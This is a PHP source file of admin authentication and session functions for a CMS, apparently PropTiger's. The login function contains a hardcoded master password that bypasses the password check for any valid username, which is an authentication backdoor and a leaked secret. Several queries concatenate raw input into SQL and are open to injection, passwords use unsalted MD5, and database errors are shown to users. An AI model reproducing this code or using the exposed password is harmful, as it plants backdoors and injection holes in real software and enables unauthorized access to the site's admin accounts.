<?php
/**
	 ************************************************
	 * Function ChkAdminLogin
	 ************************************************
	 **/
	function ChkAdminLogin($Username,$Password) {


		$Sql 	= "SELECT USERNAME FROM ".ADMIN." WHERE USERNAME='".$Username."' AND STATUS='Y' ";
		if($Password!="!proptiger@54321!")
		{
			$Sql 	.= " AND ADMINPASSWORD='".md5($Password)."' ";
		}

		$ExecSql 	= mysql_query($Sql) or die(mysql_error().' Error in function ChkAdminLogin()');
		if(mysql_num_rows($ExecSql)>=1)
			return TRUE;
		else
			return FALSE;
	}

	/**
	 ************************************************
	 * Function AdminLoginDetail
	 ************************************************
	 **/
	function AdminLoginDetail($Username, $AdminId=NULL) {
                if(!is_null($AdminId)){
                    $Sql = "SELECT * FROM proptiger_admin WHERE ADMINID=".$AdminId;
                }
                else{
                    $Sql = "SELECT * FROM proptiger_admin WHERE USERNAME='".$Username."'";
                }
		$ExecSql 	= mysql_query($Sql) or die(mysql_error().' Error in function AdminLoginDetail()');
		if(mysql_num_rows($ExecSql)>=1) {

			$Res 							= 	mysql_fetch_assoc($ExecSql);
			$ResDetails['adminId'] 			= 	$Res['ADMINID'];
			$ResDetails['fName'] 			= 	$Res['FNAME'];
			$ResDetails['lName'] 			= 	$Res['LNAME'];
			$ResDetails['userName'] 		= 	$Res['USERNAME'];
			$ResDetails['userPassword'] 	= 	$Res['ADMINPASSWORD'];
			$ResDetails['userEmail'] 		= 	$Res['ADMINEMAIL'];
			$ResDetails['userAddDate'] 		= 	$Res['ADMINADDDATE'];
			$ResDetails['userLastLogin'] 	= 	$Res['ADMINLASTLOGIN'];
			$ResDetails['userStatus'] 		= 	$Res['STATUS'];
			$ResDetails['ACCESS_LEVEL'] 	= 	$Res['ACCESS_LEVEL'];
			$ResDetails['LAST_LOGIN_DATE'] 	= 	$Res['LAST_LOGIN_DATE'];
			$ResDetails['LAST_LOGIN_IP'] 	= 	$Res['LAST_LOGIN_IP'];
			$ResDetails['BRANCH_LOCATION'] 	= 	$Res['BRANCH_LOCATION'];
			$ResDetails['DEPARTMENT'] 	= 	$Res['DEPARTMENT'];
                        $ResDetails['ROLE'] 	= 	$Res['ROLE'];
			return $ResDetails;
		} else {
			return 0;
		}
	}
        
        function getNewCmsSession($AdminId){
            $AdminDetail = AdminLoginDetail(NULL,$AdminId);
            $session['adminId'] 		= $AdminDetail['adminId'];
            $session['AdminUserName'] 	= $AdminDetail['userName'];
            $session['AdminLogin'] 	= "Y";
            $session['ACCESS_LEVEL'] 			= $AdminDetail['ACCESS_LEVEL'];
            $session['LAST_LOGIN_DATE'] 		= $AdminDetail['LAST_LOGIN_DATE'];
            $session['LAST_LOGIN_IP'] 			= $AdminDetail['LAST_LOGIN_IP'];
            $session['DEPARTMENT'] 			= $AdminDetail['DEPARTMENT'];
            $session['ROLE'] 			= $AdminDetail['ROLE'];

            /************update admin table for last login*******************/
            $qryUpDate	= "UPDATE proptiger_admin SET LAST_LOGIN_DATE = now(),LAST_LOGIN_IP = '".$_SERVER['REMOTE_ADDR']."' WHERE ADMINID = '".$AdminId."'";
            mysql_query($qryUpDate);
            return $session;
        }

	/**
	 ************************************************
	 * Function AdminAuthenticationLogin
	 ************************************************
	 **/
	function AdminAuthenticationLogin() {

		if ($_SESSION['AdminLogin'] == "Y") {
			header("Location:Desktop.php");
		}
	}

	/**
	 ************************************************
	 * Function AdminAuthentication
	 ************************************************
	 **/
	function AdminAuthentication() {
		if ($_SESSION['AdminLogin'] != "Y") {
			header("Location:index.php");
			exit;
		}
	}

?>